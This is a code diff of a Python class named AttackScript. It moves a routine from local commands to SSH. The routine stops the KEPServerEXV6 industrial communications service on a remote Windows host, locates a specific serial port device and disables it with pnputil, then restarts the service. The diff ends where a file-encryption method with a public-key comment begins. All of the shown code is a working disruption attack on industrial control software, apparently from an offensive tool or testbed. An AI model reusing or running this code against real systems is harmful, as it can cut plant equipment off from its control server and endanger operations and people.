@@ -262,50 +262,28 @@ class AttackScript:
     def disable_COMPort(self) -> None:
         """
         Disable a COM port
-        # TODO: Change to ssh_run_command()
+        # TODO: Add Exception handling
         """
-        netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-        if "RUNNING" in netshare.stdout:
-            print("Kepserver is running, Stopping now.")
-            service_name = "KEPServerEXV6"
-            cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-            output = cp.stdout.decode('utf-8').strip().split()
-            if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-            else:
-                print("The " + output[1] + " service is " + output[9])
-                sleep(15)
 
-        cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
-        dump = cp.stdout.split()
+        self.kep_server_stop()
+
+        checkCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /enum-devices /class Ports')
+        dump = checkCOM.split()
         deviceID = ""
         for i in range(0, len(dump)):
-            if dump[i].decode("utf-8") == "ID:":
-                deviceID = dump[i+1].decode("utf-8")
-                if "CVBCx196117" in deviceID:
-                    comPort = deviceID
-        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/disable-device\" \"" + comPort + "\""
-        with open("script.bat", "w") as f:
-            f.write(batchscript)
-        cp = run(["script.bat"],stdout=PIPE ,shell=True)
-        if "successfully" in cp.stdout.decode('utf-8'):
-            print(cp.stdout.decode('utf-8'))
+            if dump[i] == "ID:":
+                    deviceID = dump[i+1]
+                    if "CVBCx196117" in deviceID:
+                            comPort = deviceID
+                            print(comPort)
 
-            netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-            if "RUNNING" not in netshare.stdout:
-                print("Kepserver is stopped, Starting now.")
-                service_name = "KEPServerEXV6"
-                cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
-                output = cp.stdout.decode('utf-8').strip().split()
-                if "FAILED" in cp.stdout.decode('utf-8'):
-                    print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-                else:
-                    print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
+        disableCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /disable-device "{comPort}"')
+        if "successfully" in disableCOM:
+            print(disableCOM)
+            self.kep_server_start()
         else:
-            # print(cp.stdout.decode('utf-8'))
+            print(disableCOM)
             print("Device not disabled. \nFail.\n")
-
-        remove("script.bat")
 
     def encrypt_files(self) -> None:
         #public key
